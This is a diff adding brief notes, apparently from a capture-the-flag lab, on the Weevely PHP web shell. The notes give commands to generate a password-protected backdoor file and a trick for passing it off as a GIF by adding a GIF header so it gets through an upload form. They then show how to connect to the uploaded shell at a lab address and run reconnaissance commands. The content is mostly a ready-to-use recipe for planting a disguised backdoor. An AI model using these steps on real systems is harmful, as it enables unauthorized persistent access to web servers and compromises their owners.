@@ -1,0 +1,15 @@
+Weevely is a stealth PHP web shell that simulate telnet-like connection. It is an essential tool for web application post exploitation, and can be used as stealth backdoor or as a web shell to manage legit web accounts, even free hosted ones.
+
+Create a backdoor file with password mahsecret using -> sudo weevely generate mahsecret home/name/Desktop/file/door.php
+
+You can rename it to .gif if you add GIF98 in the beginning of the file.
+
+Then,
+
+	weevely http://10.5.5.113/imfadministrator/uploads/e3b942266237.gif mahsecret  -> To access shell 
+
+	weevely http://10.5.5.113/imfadministrator/uploads/e3b942266237.gif mahsecret ls
+	
+	netstat -antp 
+	cat /etc/services | grep 7788  -> check services running on a specific port
+	
